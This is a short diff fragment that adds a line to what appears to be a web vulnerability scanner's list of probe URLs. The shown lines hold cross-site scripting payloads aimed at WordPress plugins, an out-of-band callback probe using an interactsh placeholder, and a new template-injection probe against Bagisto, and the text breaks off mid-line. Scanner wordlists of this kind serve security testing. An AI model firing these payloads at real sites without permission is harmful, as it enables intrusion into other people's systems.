@@ -240,3 +240,4 @@
 /wp-content/plugins/canto/includes/lib/tree.php?subdomain={{interactsh-url}}?
 /wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /index.php/%3C/script%3E%3Cscript%3Edocument.write(
+/bagisto-common/search?query={{2288*
